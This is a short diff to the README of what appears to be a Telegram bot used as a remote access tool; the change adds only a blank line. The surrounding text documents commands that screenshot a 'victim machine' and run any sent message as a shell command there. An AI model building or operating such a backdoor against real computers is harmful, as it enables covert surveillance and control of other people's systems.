@@ -40,6 +40,7 @@ That is basically it. You now need to start the new bot that you created using B
 
 ## Different Commands
 `/start` - Starts the bot
+
 `/screenshot` - Takes the screenshot of the thing currently on the screen and sends it back
 `any message` - It will interpret it as a command to be sent on the cmd/terminal on the victim machine. For example, `dir` or `ls` will get executed and the bot would send back the list of files in the current directory.
 
